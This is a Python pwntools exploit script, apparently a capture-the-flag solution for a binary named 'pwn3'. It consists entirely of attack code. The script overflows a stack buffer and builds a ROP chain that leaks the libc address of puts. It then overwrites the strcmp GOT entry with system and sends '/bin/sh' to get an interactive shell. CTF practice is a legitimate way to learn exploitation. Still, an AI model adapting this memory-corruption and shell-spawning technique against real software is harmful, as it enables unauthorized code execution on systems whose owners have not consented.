from pwn import *

context.log_level = 'debug'

p = process('./pwn3')
elf = ELF('./pwn3')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

payload = 'a'*0x78 + p64(0x0)
p.recvuntil('input: ')
p.sendline('a')
p.recvuntil('value: \n')
#gdb.attach(p,'b *0x400ecd')
#hijack fd-> 0
p.sendline(payload)
#change buf
p.recvuntil('target: ')
p.sendline(payload)
p.recvuntil('input: ')
p.sendline('a')
p.recvuntil('random value: \n')

#rop and leak libc , hijack got
puts_got = elf.got['puts']
strcmp_got = elf.got['strcmp']
read_got = elf.got['read']
offset_system = 0x0000000000045390
p6_ret = 0x40109A
mov_call = 0x401080
'''
rbx rbp r12 r13 r14 r15
0   1   got rdi rsi rdx
'''
payload = 'a'*0x78 + p64(0) + 'bbbbbbbb' 
payload += p64(p6_ret) + p64(0) + p64(1) + p64(puts_got)
payload += p64(puts_got) + p64(0) + p64(0) + p64(mov_call)
payload += 'a'*8 + p64(0) + p64(1) + p64(read_got)
payload += p64(0) + p64(strcmp_got) + p64(0x8) + p64(mov_call)
payload += 'a'*56 + p64(0x400D2A)
p.sendline(payload)
p.recvuntil('it?\n')
libc_base = u64(p.recv(6).ljust(8,'\x00')) - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
log.success('libc_base addr : 0x%x'%libc_base)
log.success('system addr : 0x%x'%system_addr)

#hijack strcmp_got -> system
p.send(p64(system_addr))

#trigger system('/bin/sh\x00')
p.recvuntil('input: ')
p.sendline('a')
p.recvuntil('value: \n')
p.sendline('/bin/sh\x00')
p.interactive()
